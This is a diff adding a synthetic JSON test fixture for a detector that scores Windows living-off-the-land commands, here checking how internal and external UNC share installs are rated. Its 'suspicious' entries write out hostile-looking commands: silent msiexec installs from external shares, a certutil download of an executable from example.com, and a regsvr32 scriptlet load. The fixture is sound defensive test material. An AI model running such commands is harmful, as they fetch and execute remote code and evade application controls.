@@ -1,0 +1,17 @@
+{
+  "_note": "DEPENDENT examples, written on 2026-11-13 after the owner confirmed a specific issue (high severity for msiexec with an internal UNC share). They test that fix and are not an independent evaluation. Synthetic; example.* and RFC 5737 addresses only.",
+  "issue": "LotL: internal UNC file shares without other signals must not be high; external UNC stays flagged (medium or higher); internal share plus another signal stays high",
+  "suspicious": [
+    { "id": "dp-unc-public-ip", "min": "medium", "cmd": "msiexec /i \\\\203.0.113.7\\pub\\update.msi /qn" },
+    { "id": "dp-unc-webdav", "min": "medium", "cmd": "msiexec /q /i \\\\files.example.com@SSL\\DavWWWRoot\\setup.msi" },
+    { "id": "dp-unc-fqdn", "min": "medium", "cmd": "msiexec /i \\\\share.example.net\\drop\\tool.msi /quiet" },
+    { "id": "dp-unc-internal-plus-url", "min": "high", "cmd": "msiexec /i \\\\fileserver\\pkg\\a.msi /qn & certutil -urlcache -f http://example.com/b.exe b.exe" },
+    { "id": "dp-unc-internal-awl", "min": "high", "cmd": "regsvr32 /s /n /u /i:\\\\fs01\\scripts\\file.sct scrobj.dll" }
+  ],
+  "benign": [
+    { "id": "db-unc-fileserver", "max": "medium", "cmd": "msiexec /i \\\\fileserver\\packages\\7zip.msi /qn" },
+    { "id": "db-unc-corp", "max": "medium", "cmd": "msiexec /i \\\\deploy.corp\\software\\agent.msi /quiet /norestart" },
+    { "id": "db-unc-private-ip", "max": "medium", "cmd": "msiexec /i \\\\10.20.30.40\\msi\\reader.msi /qb" },
+    { "id": "db-unc-local-domain", "max": "medium", "cmd": "msiexec /package \\\\nas01.local\\it\\vpn-client.msi /passive" }
+  ]
+}
